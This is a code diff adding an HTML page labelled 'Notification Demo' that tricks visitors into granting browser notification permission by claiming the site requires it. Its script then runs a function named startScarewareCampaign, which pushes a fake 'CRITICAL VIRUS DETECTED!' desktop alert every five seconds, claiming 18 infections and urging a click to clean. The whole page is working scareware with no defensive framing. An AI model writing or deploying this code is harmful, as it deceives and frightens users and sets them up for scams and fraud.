@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notification Demo</title>
+</head>
+<body>
+
+    <div style="text-align: center; margin-top: 100px;">
+        <h2>Allow Notifications to continue</h2>
+        <p>This site requires notification permissions to function properly.</p>
+        <button onclick="requestNotificationPermission()" style="padding: 10px 20px; font-size: 16px;">
+            Enable Features
+        </button>
+    </div>
+
+    <script>
+        function requestNotificationPermission() {
+            // Check if the browser supports the Notifications API
+            if (!("Notification" in window)) {
+                alert("This browser does not support desktop notifications.");
+                return;
+            }
+
+            // Request permission from the user
+            Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') {
+                    // If the user clicks "Allow", begin the alerts
+                    startScarewareCampaign();
+                }
+            });
+        }
+
+        // Function to continuously push alarming fake virus alerts to the desktop
+        function startScarewareCampaign() {
+            setInterval(function() {
+                new Notification("CRITICAL VIRUS DETECTED!", {
+                    body: "Your system is infected with 18 viruses. Click to clean immediately!",
+                    icon: "warning-shield.png" // Replace with a valid icon URL if needed
+                });
+            }, 5000); // Alerts every 5 seconds
+        }
+    </script>
+</body>
+</html>
